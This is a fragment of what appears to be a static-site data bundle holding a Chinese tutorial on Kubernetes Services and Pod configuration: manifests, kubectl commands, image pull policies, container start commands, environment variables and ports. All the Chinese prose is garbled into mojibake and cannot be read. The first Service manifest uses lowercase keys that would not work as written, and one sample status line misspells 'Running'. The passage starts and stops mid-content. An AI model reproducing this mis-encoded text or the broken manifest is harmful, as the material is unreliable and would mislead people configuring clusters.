ä¾å¦å¨ççµèä¸»æºä¸éè¿æµè§å¨è®¿é®ä¸é¢çå°å\nhttp://192.168.5.4:31928/\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå é¤ service\n\n[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service "svc-nginx-1" deleted\n\n\n1\n\n\néç½®æ¹å¼\nåå»ºä¸ä¸ª svc-nginx.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: service\nmetadata:\n  name: svc-nginx\n  namespace: dev\nspec:\n  # åºå®svcçåç½ipï¼å¦æä¸æå®ä¼éæºåé\n  clusterip: 10.109.179.231 \n  ports:\n  - port: 80\n    protocol: tcp\n    targetport: 80\n  selector:\n    run: nginx\n  type: clusterip\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f svc-nginx.yaml\nå é¤ï¼kubectl delete -f svc-nginx.yaml',charsets:{cjk:!0}},{title:"kubernetes(äº) Pod ä»ç»åéç½®",frontmatter:{title:"kubernetes(äº) Pod ä»ç»åéç½®",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/604",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/604.kubernetes(%E4%BA%94)%20Pod%20%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE.html",relativePath:"01.è¿ç»´/60.Kubernetes/604.kubernetes(äº) Pod ä»ç»åéç½®.md",key:"v-668f65e8",path:"/kubernetes/604/",headers:[{level:2,title:"ä»ç»",slug:"ä»ç»",normalizedTitle:"ä»ç»",charIndex:2},{level:3,title:"Podç»æ",slug:"podç»æ",normalizedTitle:"pod ç»æ",charIndex:9},{level:3,title:"Podå®ä¹",slug:"podå®ä¹",normalizedTitle:"pod å®ä¹",charIndex:258},{level:2,title:"Podéç½®",slug:"podéç½®",normalizedTitle:"pod éç½®",charIndex:5169},{level:3,title:"åºæ¬éç½®",slug:"åºæ¬éç½®",normalizedTitle:"åºæ¬éç½®",charIndex:5723},{level:3,title:"éåæå",slug:"éåæå",normalizedTitle:"éåæå",charIndex:5466},{level:3,title:"å¯å¨å½ä»¤",slug:"å¯å¨å½ä»¤",normalizedTitle:"å¯å¨å½ä»¤",charIndex:714},{level:3,title:"ç¯å¢åé",slug:"ç¯å¢åé",normalizedTitle:"ç¯å¢åé",charIndex:1216},{level:3,title:"ç«¯å£è®¾ç½®",slug:"ç«¯å£è®¾ç½®",normalizedTitle:"ç«¯å£è®¾ç½®",charIndex:10966},{level:3,title:"èµæºéé¢",slug:"èµæºéé¢",normalizedTitle:"èµæºéé¢",charIndex:12205}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ä»ç» Podç»æ Podå®ä¹ Podéç½® åºæ¬éç½® éåæå å¯å¨å½ä»¤ ç¯å¢åé ç«¯å£è®¾ç½® èµæºéé¢",content:'# ä»ç»\n\n\n# Pod ç»æ\n\n\n\næ¯ä¸ª Pod ä¸­é½å¯ä»¥åå«ä¸ä¸ªæèå¤ä¸ªå®¹å¨ï¼è¿äºå®¹å¨å¯ä»¥åä¸ºä¸¤ç±»ï¼\n\n * ç¨æ·ç¨åºæå¨çå®¹å¨ï¼æ°éå¯å¤å¯å°\n * Pause å®¹å¨ï¼è¿æ¯æ¯ä¸ª Pod é½ä¼æçä¸ä¸ªæ ¹å®¹å¨ï¼å®çä½ç¨æä¸¤ä¸ªï¼\n   * å¯ä»¥ä»¥å®ä¸ºä¾æ®ï¼è¯ä¼°æ´ä¸ª Pod çå¥åº·ç¶æ\n   * å¯ä»¥å¨æ ¹å®¹å¨ä¸è®¾ç½® Ip å°åï¼å¶å®å®¹å¨é½æ­¤ Ipï¼Pod IPï¼ï¼ä»¥å®ç° Pod åé¨çç½è·¯éä¿¡\n     è¿éæ¯Podåé¨çéè®¯ï¼Podçä¹é´çéè®¯éç¨èæäºå±ç½ç»ææ¯æ¥å®ç°ï¼æä»¬å½åç¯å¢ç¨çæ¯Flannel\n\n\n# Pod å®ä¹\n\nä¸é¢æ¯ Pod çèµæºæ¸åï¼\n\napiVersion: v1     #å¿éï¼çæ¬å·ï¼ä¾å¦v1\nkind: Pod       ã #å¿éï¼èµæºç±»åï¼ä¾å¦ Pod\nmetadata:       ã #å¿éï¼åæ°æ®\n  name: string     #å¿éï¼Podåç§°\n  namespace: string  #Podæå±çå½åç©ºé´,é»è®¤ä¸º"default"\n  labels:       ãã  #èªå®ä¹æ ç­¾åè¡¨\n    - name: string      ã          \nspec:  #å¿éï¼Podä¸­å®¹å¨çè¯¦ç»å®ä¹\n  containers:  #å¿éï¼Podä¸­å®¹å¨åè¡¨\n  - name: string   #å¿éï¼å®¹å¨åç§°\n    image: string  #å¿éï¼å®¹å¨çéååç§°\n    imagePullPolicy: [ Always|Never|IfNotPresent ]  #è·åéåçç­ç¥ \n    command: [string]   #å®¹å¨çå¯å¨å½ä»¤åè¡¨ï¼å¦ä¸æå®ï¼ä½¿ç¨æåæ¶ä½¿ç¨çå¯å¨å½ä»¤\n    args: [string]      #å®¹å¨çå¯å¨å½ä»¤åæ°åè¡¨\n    workingDir: string  #å®¹å¨çå·¥ä½ç®å½\n    volumeMounts:       #æè½½å°å®¹å¨åé¨çå­å¨å·éç½®\n    - name: string      #å¼ç¨podå®ä¹çå±äº«å­å¨å·çåç§°ï¼éç¨volumes[]é¨åå®ä¹ççå·å\n      mountPath: string #å­å¨å·å¨å®¹å¨åmountçç»å¯¹è·¯å¾ï¼åºå°äº512å­ç¬¦\n      readOnly: boolean #æ¯å¦ä¸ºåªè¯»æ¨¡å¼\n    ports: #éè¦æ´é²çç«¯å£åºå·åè¡¨\n    - name: string        #ç«¯å£çåç§°\n      containerPort: int  #å®¹å¨éè¦çå¬çç«¯å£å·\n      hostPort: int       #å®¹å¨æå¨ä¸»æºéè¦çå¬çç«¯å£å·ï¼é»è®¤ä¸Containerç¸å\n      protocol: string    #ç«¯å£åè®®ï¼æ¯æTCPåUDPï¼é»è®¤TCP\n    env:   #å®¹å¨è¿è¡åéè®¾ç½®çç¯å¢åéåè¡¨\n    - name: string  #ç¯å¢åéåç§°\n      value: string #ç¯å¢åéçå¼\n    resources: #èµæºéå¶åè¯·æ±çè®¾ç½®\n      limits:  #èµæºéå¶çè®¾ç½®\n        cpu: string     #Cpuçéå¶ï¼åä½ä¸ºcoreæ°ï¼å°ç¨äºdocker run --cpu-sharesåæ°\n        memory: string  #åå­éå¶ï¼åä½å¯ä»¥ä¸ºMib/Gibï¼å°ç¨äºdocker run --memoryåæ°\n      requests: #èµæºè¯·æ±çè®¾ç½®\n        cpu: string    #Cpuè¯·æ±ï¼å®¹å¨å¯å¨çåå§å¯ç¨æ°é\n        memory: string #åå­è¯·æ±,å®¹å¨å¯å¨çåå§å¯ç¨æ°é\n    lifecycle: #çå½å¨æé©å­\n        postStart: #å®¹å¨å¯å¨åç«å³æ§è¡æ­¤é©å­,å¦ææ§è¡å¤±è´¥,ä¼æ ¹æ®éå¯ç­ç¥è¿è¡éå¯\n        preStop: #å®¹å¨ç»æ­¢åæ§è¡æ­¤é©å­,æ è®ºç»æå¦ä½,å®¹å¨é½ä¼ç»æ­¢\n    livenessProbe:  #å¯¹Podååå®¹å¨å¥åº·æ£æ¥çè®¾ç½®ï¼å½æ¢æµæ ååºå æ¬¡åå°èªå¨éå¯è¯¥å®¹å¨\n      exec:       ã #å¯¹Podå®¹å¨åæ£æ¥æ¹å¼è®¾ç½®ä¸ºexecæ¹å¼\n        command: [string]  #execæ¹å¼éè¦å¶å®çå½ä»¤æèæ¬\n      httpGet:       #å¯¹Podåä¸ªå®¹å¨å¥åº·æ£æ¥æ¹æ³è®¾ç½®ä¸ºHttpGetï¼éè¦å¶å®Pathãport\n        path: string\n        port: number\n        host: string\n        scheme: string\n        HttpHeaders:\n        - name: string\n          value: string\n      tcpSocket:     #å¯¹Podåä¸ªå®¹å¨å¥åº·æ£æ¥æ¹å¼è®¾ç½®ä¸ºtcpSocketæ¹å¼\n         port: number\n       initialDelaySeconds: 0       #å®¹å¨å¯å¨å®æåé¦æ¬¡æ¢æµçæ¶é´ï¼åä½ä¸ºç§\n       timeoutSeconds: 0    ãã    #å¯¹å®¹å¨å¥åº·æ£æ¥æ¢æµç­å¾ååºçè¶æ¶æ¶é´ï¼åä½ç§ï¼é»è®¤1ç§\n       periodSeconds: 0     ãã    #å¯¹å®¹å¨çæ§æ£æ¥çå®ææ¢æµæ¶é´è®¾ç½®ï¼åä½ç§ï¼é»è®¤10ç§ä¸æ¬¡\n       successThreshold: 0\n       failureThreshold: 0\n       securityContext:\n         privileged: false\n  restartPolicy: [Always | Never | OnFailure]  #Podçéå¯ç­ç¥\n  nodeName: <string> #è®¾ç½®NodeNameè¡¨ç¤ºå°è¯¥Podè°åº¦å°æå®å°åç§°çnodeèç¹ä¸\n  nodeSelector: obeject #è®¾ç½®NodeSelectorè¡¨ç¤ºå°è¯¥Podè°åº¦å°åå«è¿ä¸ªlabelçnodeä¸\n  imagePullSecrets: #Pulléåæ¶ä½¿ç¨çsecretåç§°ï¼ä»¥keyï¼secretkeyæ ¼å¼æå®\n  - name: string\n  hostNetwork: false   #æ¯å¦ä½¿ç¨ä¸»æºç½ç»æ¨¡å¼ï¼é»è®¤ä¸ºfalseï¼å¦æè®¾ç½®ä¸ºtrueï¼è¡¨ç¤ºä½¿ç¨å®¿ä¸»æºç½ç»\n  volumes:   #å¨è¯¥podä¸å®ä¹å±äº«å­å¨å·åè¡¨\n  - name: string    #å±äº«å­å¨å·åç§° ï¼volumesç±»åæå¾å¤ç§ï¼\n    emptyDir: {}       #ç±»åä¸ºemtyDirçå­å¨å·ï¼ä¸Podåçå½å¨æçä¸ä¸ªä¸´æ¶ç®å½ãä¸ºç©ºå¼\n    hostPath: string   #ç±»åä¸ºhostPathçå­å¨å·ï¼è¡¨ç¤ºæè½½Podæå¨å®¿ä¸»æºçç®å½\n      path: string      ãã        #Podæå¨å®¿ä¸»æºçç®å½ï¼å°è¢«ç¨äºåæä¸­mountçç®å½\n    secret:       ããã#ç±»åä¸ºsecretçå­å¨å·ï¼æè½½éç¾¤ä¸å®ä¹çsecretå¯¹è±¡å°å®¹å¨åé¨\n      scretname: string  \n      items:     \n      - key: string\n        path: string\n    configMap:         #ç±»åä¸ºconfigMapçå­å¨å·ï¼æè½½é¢å®ä¹çconfigMapå¯¹è±¡å°å®¹å¨åé¨\n      name: string\n      items:\n      - key: string\n        path: string\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\nä¸ç¥éç¸å³ç type æä»ä¹èµæºç±»åå¯åï¼å¯ä»¥éè¿ä¸ä¸ªå½ä»¤æ¥æ¥çæ¯ç§èµæºçå¯éç½®é¡¹\n\n#   kubectl explain èµæºç±»å         æ¥çæç§èµæºå¯ä»¥éç½®çä¸çº§å±æ§\n#   kubectl explain èµæºç±»å.å±æ§     æ¥çå±æ§çå­å±æ§\n[root@k8s-master01 ~]# kubectl explain pod\nKIND:     Pod\nVERSION:  v1\nFIELDS:\n   apiVersion   <string>\n   kind <string>\n   metadata     <Object>\n   spec <Object>\n   status       <Object>\n\n[root@k8s-master01 ~]# kubectl explain pod.metadata\nKIND:     Pod\nVERSION:  v1\nRESOURCE: metadata <Object>\nFIELDS:\n   annotations  <map[string]string>\n   clusterName  <string>\n   creationTimestamp    <string>\n   deletionGracePeriodSeconds   <integer>\n   deletionTimestamp    <string>\n   finalizers   <[]string>\n   generateName <string>\n   generation   <integer>\n   labels       <map[string]string>\n   managedFields        <[]Object>\n   name <string>\n   namespace    <string>\n   ownerReferences      <[]Object>\n   resourceVersion      <string>\n   selfLink     <string>\n   uid  <string>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nå¨ kubernetes ä¸­åºæ¬ææèµæºçä¸çº§å±æ§é½æ¯ä¸æ ·çï¼ä¸»è¦åå« 5 é¨åï¼\n\n * apiVersion çæ¬ï¼ç± kubernetes åé¨å®ä¹ï¼çæ¬å·å¿é¡»å¯ä»¥ç¨ kubectl api-versions æ¥è¯¢å°\n * kind ç±»åï¼ç± kubernetes åé¨å®ä¹ï¼çæ¬å·å¿é¡»å¯ä»¥ç¨ kubectl api-resources æ¥è¯¢å°\n * metadata åæ°æ®ï¼ä¸»è¦æ¯èµæºæ è¯åè¯´æï¼å¸¸ç¨çæ nameãnamespaceãlabels ç­\n * spec æè¿°ï¼è¿æ¯éç½®ä¸­æéè¦çä¸é¨åï¼éé¢æ¯å¯¹åç§èµæºéç½®çè¯¦ç»æè¿°\n * status ç¶æä¿¡æ¯ï¼éé¢çåå®¹ä¸éè¦å®ä¹ï¼ç± kubernetes èªå¨çæ\n\nå¨ä¸é¢çå±æ§ä¸­ï¼spec æ¯æ¥ä¸æ¥ç ç©¶çéç¹ï¼ç»§ç»­çä¸å®çå¸¸è§å­å±æ§:\n\n * containers <[] Object> å®¹å¨åè¡¨ï¼ç¨äºå®ä¹å®¹å¨çè¯¦ç»ä¿¡æ¯\n * nodeName æ ¹æ® nodeName çå¼å° pod è°åº¦å°æå®ç Node èç¹ä¸\n * nodeSelector <map []> æ ¹æ® NodeSelector ä¸­å®ä¹çä¿¡æ¯éæ©å°è¯¥ Pod è°åº¦å°åå«è¿äº label ç Node ä¸\n * hostNetwork æ¯å¦ä½¿ç¨ä¸»æºç½ç»æ¨¡å¼ï¼é»è®¤ä¸º falseï¼å¦æè®¾ç½®ä¸º trueï¼è¡¨ç¤ºä½¿ç¨å®¿ä¸»æºç½ç»\n * volumes <[] Object> å­å¨å·ï¼ç¨äºå®ä¹ Pod ä¸é¢æå¨çå­å¨ä¿¡æ¯\n * restartPolicy éå¯ç­ç¥ï¼è¡¨ç¤º Pod å¨éå°æéçæ¶åçå¤çç­ç¥\n\n\n# Pod éç½®\n\nä¸»è¦æ¥ç ç©¶ pod.spec.containers å±æ§ï¼è¿ä¹æ¯ pod éç½®ä¸­æä¸ºå³é®çä¸é¡¹éç½®ã\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers\nKIND:     Pod\nVERSION:  v1\nRESOURCE: containers <[]Object>   # æ°ç»ï¼ä»£è¡¨å¯ä»¥æå¤ä¸ªå®¹å¨\nFIELDS:\n   name  <string>     # å®¹å¨åç§°\n   image <string>     # å®¹å¨éè¦çéåå°å\n   imagePullPolicy  <string> # éåæåç­ç¥ \n   command  <[]string> # å®¹å¨çå¯å¨å½ä»¤åè¡¨ï¼å¦ä¸æå®ï¼ä½¿ç¨æåæ¶ä½¿ç¨çå¯å¨å½ä»¤\n   args     <[]string> # å®¹å¨çå¯å¨å½ä»¤éè¦çåæ°åè¡¨\n   env      <[]Object> # å®¹å¨ç¯å¢åéçéç½®\n   ports    <[]Object>     # å®¹å¨éè¦æ´é²çç«¯å£å·åè¡¨\n   resources <Object>      # èµæºéå¶åèµæºè¯·æ±çè®¾ç½®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# åºæ¬éç½®\n\nåå»º pod-base.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-base\n  namespace: dev\n  labels:\n    user: heima\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nä¸é¢å®ä¹äºä¸ä¸ªæ¯è¾ç®å Pod çéç½®ï¼éé¢æä¸¤ä¸ªå®¹å¨ï¼\n\n * nginxï¼ç¨ 1.17.1 çæ¬ç nginx éååå»ºï¼ï¼nginx æ¯ä¸ä¸ªè½»éçº§ web å®¹å¨ï¼\n * busyboxï¼ç¨ 1.30 çæ¬ç busybox éååå»ºï¼ï¼busybox æ¯ä¸ä¸ªå°å·§ç linux å½ä»¤éåï¼\n\n# åå»ºPod\n[root@k8s-master01 pod]# kubectl apply -f pod-base.yaml\npod/pod-base created\n\n# æ¥çPodç¶åµ\n# READY 1/2 : è¡¨ç¤ºå½åPodä¸­æ2ä¸ªå®¹å¨ï¼å¶ä¸­1ä¸ªåå¤å°±ç»ªï¼1ä¸ªæªå°±ç»ª\n# RESTARTS  : éå¯æ¬¡æ°ï¼å ä¸ºæ1ä¸ªå®¹å¨æéäºï¼Podä¸ç´å¨éå¯è¯å¾æ¢å¤å®\n[root@k8s-master01 pod]# kubectl get pod -n dev\nNAME       READY   STATUS    RESTARTS   AGE\npod-base   1/2     Running   4          95s\n\n# å¯ä»¥éè¿describeæ¥çåé¨çè¯¦æ\n# æ­¤æ¶å·²ç»è¿è¡èµ·æ¥äºä¸ä¸ªåºæ¬çPodï¼æä»¥å®ææ¶æé®é¢\n[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# éåæå\n\nå½æä»¬ç Pod å·²ç»æåéåå¹¶å¯å¨å®¹å¨ï¼å¶ä» Pod ä¹éè¦æ­¤éåï¼é£ä¹æ­¤æ¶å¶ä» Pod æåç¸åéåæ¯ä»éåæºæåï¼è¿æ¯ç´æ¥ä½¿ç¨å·²ç»æåè¿çéåï¼è¿å°±ç± imagepullpolicy æ¥å³å®ã\n\nåå»º pod-imagepullpolicy.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-imagepullpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    imagePullPolicy: Never # ç¨äºè®¾ç½®éåæåç­ç¥\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nimagePullPolicyï¼ç¨äºè®¾ç½®éåæåç­ç¥ï¼kubernetes æ¯æéç½®ä¸ç§æåç­ç¥ï¼\n\n * Alwaysï¼æ»æ¯ä»è¿ç¨ä»åºæåéåï¼ä¸ç´è¿ç¨ä¸è½½ï¼\n * IfNotPresentï¼æ¬å°æåä½¿ç¨æ¬å°éåï¼æ¬å°æ²¡æåä»è¿ç¨ä»åºæåéåï¼æ¬å°æå°±æ¬å° æ¬å°æ²¡è¿ç¨ä¸è½½ï¼\n * Neverï¼åªä½¿ç¨æ¬å°éåï¼ä»ä¸å»è¿ç¨ä»åºæåï¼æ¬å°æ²¡æå°±æ¥é ï¼ä¸ç´ä½¿ç¨æ¬å°ï¼\n\n> é»è®¤å¼è¯´æ:\n> å¦æéå tag ä¸ºå·ä½çæ¬å·ï¼ é»è®¤ç­ç¥æ¯ï¼IfNotPresent\n> å¦æéå tag ä¸ºï¼latestï¼æç»çæ¬ï¼ ï¼é»è®¤ç­ç¥æ¯ always\n\n# åå»ºPod\n[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yaml\npod/pod-imagepullpolicy created\n\n# æ¥çPodè¯¦æ\n# æ­¤æ¶ææ¾å¯ä»¥çå°nginxéåæä¸æ­¥Pulling image "nginx:1.17.1"çè¿ç¨\n[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev\n......\nEvents:\n  Type     Reason     Age               From               Message\n  ----     ------     ----              ----               -------\n  Normal   Scheduled  <unknown>         default-scheduler  Successfully assigned dev/pod-imagePullPolicy to node1\n  Normal   Pulling    32s               kubelet, node1     Pulling image "nginx:1.17.1"\n  Normal   Pulled     26s               kubelet, node1     Successfully pulled image "nginx:1.17.1"\n  Normal   Created    26s               kubelet, node1     Created container nginx\n  Normal   Started    25s               kubelet, node1     Started container nginx\n  Normal   Pulled     7s (x3 over 25s)  kubelet, node1     Container image "busybox:1.30" already present on machine\n  Normal   Created    7s (x3 over 25s)  kubelet, node1     Created container busybox\n  Normal   Started    7s (x3 over 25s)  kubelet, node1     Started container busybox\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¯å¨å½ä»¤\n\nå¨ åºæ¬éç½® çæ¡ä¾ä¸­ï¼æä¸ä¸ªé®é¢æ²¡æè§£å³ï¼å°±æ¯ busybox å®¹å¨ä¸ç´æ²¡ææåè¿è¡ï¼é£ä¹å°åºæ¯ä»ä¹åå å¯¼è´è¿ä¸ªå®¹å¨çæéå¢ï¼\n\nbusybox å¹¶ä¸æ¯ä¸ä¸ªç¨åºï¼èæ¯ç±»ä¼¼äºä¸ä¸ªå·¥å·ç±»çéåï¼kubernetes éç¾¤å¯å¨ç®¡çåï¼å®ä¼èªå¨å³é­ãè§£å³æ¹æ³å°±æ¯è®©å¶ä¸ç´å¨è¿è¡ï¼è¿å°±ç¨å°äº command éç½®ã\n\nåå»º pod-command.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-command\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n    # å®¹å¨å¯å¨æåï¼æ§è¡æ­»å¾ªç¯\n    command: ["/bin/sh","-c","touch /tmp/hello.txt;while true;do /bin/echo $(date +%T) >> /tmp/hello.txt; sleep 3; done;"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncommandï¼ç¨äºå¨ pod ä¸­çå®¹å¨åå§åå®æ¯ä¹åè¿è¡ä¸ä¸ªå½ä»¤ã\n\n> ç¨å¾®è§£éä¸ä¸é¢å½ä»¤çææï¼\n> "/bin/sh","-c", ä½¿ç¨ sh æ§è¡å½ä»¤\n> touch /tmp/hello.txt; åå»ºä¸ä¸ª /tmp/hello.txt æä»¶\n> while true;do /bin/echo $(date +% T) >> /tmp/hello.txt; sleep 3; done; æ¯é 3 ç§åæä»¶ä¸­åå¥å½åæ¶é´\n\n# åå»ºPod\n[root@k8s-master01 pod]# kubectl create  -f pod-command.yaml\npod/pod-command created\n\n# æ¥çPodç¶æ\n# æ­¤æ¶åç°ä¸¤ä¸ªpodé½æ­£å¸¸è¿è¡äº\n[root@k8s-master01 pod]# kubectl get pods pod-command -n dev\nNAME          READY   STATUS   RESTARTS   AGE\npod-command   2/2     Runing   0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nè¿å¥ pod ä¸­ç busybox å®¹å¨ï¼æ¥çæä»¶åå®¹ï¼å½ä»¤å¦ä¸\n\nkubectl exec  podåç§° -n å½åç©ºé´ -it -c å®¹å¨åç§° /bin/sh\n\n\n1\n\n\nä½¿ç¨è¿ä¸ªå½ä»¤å°±å¯ä»¥è¿å¥æä¸ªå®¹å¨çåé¨ï¼ç¶åè¿è¡ç¸å³æä½äºï¼æ¯å¦ï¼å¯ä»¥æ¥ç txt æä»¶çåå®¹ãæ¼ç¤ºï¼\n\n[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh\n/ # tail -f /tmp/hello.txt\n14:44:19\n14:44:22\n14:44:25\n\n\n1\n2\n3\n4\n5\n\n\n> ç¹å«è¯´æï¼\n> éè¿ä¸é¢åç° command å·²ç»å¯ä»¥å®æå¯å¨å½ä»¤åä¼ éåæ°çåè½ï¼ä¸ºä»ä¹è¿éè¿è¦æä¾ä¸ä¸ª args éé¡¹ï¼ç¨äºä¼ éåæ°å¢ï¼è¿å¶å®è· docker æç¹å³ç³»ï¼kubernetes ä¸­ç commandãargs ä¸¤é¡¹å¶å®æ¯å®ç°è¦ç Dockerfile ä¸­ ENTRYPOINT çåè½ã\n> 1 å¦æ command å args åæ²¡æåï¼é£ä¹ç¨ Dockerfile çéç½®ã\n> 2 å¦æ command åäºï¼ä½ args æ²¡æåï¼é£ä¹ Dockerfile é»è®¤çéç½®ä¼è¢«å¿½ç¥ï¼æ§è¡è¾å¥ç command\n> 3 å¦æ command æ²¡åï¼ä½ args åäºï¼é£ä¹ Dockerfile ä¸­éç½®ç ENTRYPOINT çå½ä»¤ä¼è¢«æ§è¡ï¼ä½¿ç¨å½å args çåæ°\n> 4 å¦æ command å args é½åäºï¼é£ä¹ Dockerfile çéç½®è¢«å¿½ç¥ï¼æ§è¡ command å¹¶è¿½å ä¸ args åæ°\n\n\n# ç¯å¢åé\n\nåå»º pod-env.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-env\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do /bin/echo $(date +%T);sleep 60; done;"]\n    env: # è®¾ç½®ç¯å¢åéåè¡¨\n    - name: "username"\n      value: "admin"\n    - name: "password"\n      value: "123456"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nenvï¼ç¯å¢åéï¼ç¨äºå¨ pod ä¸­çå®¹å¨è®¾ç½®ç¯å¢åéã\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-env.yaml\npod/pod-env created\n\n# è¿å¥å®¹å¨ï¼è¾åºç¯å¢åé\n[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh\n/ # echo $username\nadmin\n/ # echo $password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nè¿ç§æ¹å¼ä¸æ¯å¾æ¨èï¼æ¨èå°è¿äºéç½®åç¬å­å¨å¨éç½®æä»¶ä¸­ï¼è¿ç§æ¹å¼å°å¨åé¢ä»ç»ã\n\n\n# ç«¯å£è®¾ç½®\n\næ¬å°èæ¥ä»ç»å®¹å¨çç«¯å£è®¾ç½®ï¼ä¹å°±æ¯ containers ç ports éé¡¹ã\n\né¦åçä¸ ports æ¯æçå­éé¡¹ï¼\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.ports\nKIND:     Pod\nVERSION:  v1\nRESOURCE: ports <[]Object>\nFIELDS:\n   name         <string>  # ç«¯å£åç§°ï¼å¦ææå®ï¼å¿é¡»ä¿è¯nameå¨podä¸­æ¯å¯ä¸ç\t\t\n   containerPort<integer> # å®¹å¨è¦çå¬çç«¯å£(0<x<65536)\n   hostPort     <integer> # å®¹å¨è¦å¨ä¸»æºä¸å¬å¼çç«¯å£ï¼å¦æè®¾ç½®ï¼ä¸»æºä¸åªè½è¿è¡å®¹å¨çä¸ä¸ªå¯æ¬(ä¸è¬çç¥) \n   hostIP       <string>  # è¦å°å¤é¨ç«¯å£ç»å®å°çä¸»æºIP(ä¸è¬çç¥)\n   protocol     <string>  # ç«¯å£åè®®ãå¿é¡»æ¯UDPãTCPæSCTPãé»è®¤ä¸ºâTCPâã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ¥ä¸æ¥ï¼ç¼åä¸ä¸ªæµè¯æ¡ä¾ï¼åå»º pod-ports.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-ports\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: # è®¾ç½®å®¹å¨æ´é²çç«¯å£åè¡¨\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-ports.yaml\npod/pod-ports created\n\n# æ¥çpod\n# å¨ä¸é¢å¯ä»¥ææ¾çå°éç½®ä¿¡æ¯\n[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml\n......\nspec:\n  containers:\n  - image: nginx:1.17.1\n    imagePullPolicy: IfNotPresent\n    name: nginx\n    ports:\n    - containerPort: 80\n      name: nginx-port\n      protocol: TCP\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè®¿é®å®¹å¨ä¸­çç¨åºéè¦ä½¿ç¨çæ¯ podip:containerPort\n\n\n# èµæºéé¢\n\nå®¹å¨ä¸­çç¨åºè¦è¿è¡ï¼è¯å®æ¯è¦å ç¨ä¸å®èµæºçï¼æ¯å¦ cpu ååå­ç­ï¼å¦æä¸å¯¹æä¸ªå®¹å¨çèµæºåéå¶ï¼é£ä¹å®å°±å¯è½åæå¤§éèµæºï¼å¯¼è´å¶å®å®¹å¨æ æ³è¿è¡ãéå¯¹è¿ç§æåµï¼kubernetes æä¾äºå¯¹åå­å cpu çèµæºè¿è¡éé¢çæºå¶ï¼è¿ç§æºå¶ä¸»è¦éè¿ resources éé¡¹å®ç°ï¼ä»æä¸¤ä¸ªå­éé¡¹ï¼\n\n * limitsï¼ç¨äºéå¶è¿è¡æ¶å®¹å¨çæå¤§å ç¨èµæºï¼å½å®¹å¨å ç¨èµæºè¶è¿ limits æ¶ä¼è¢«ç»æ­¢ï¼å¹¶è¿è¡éå¯\n * requests 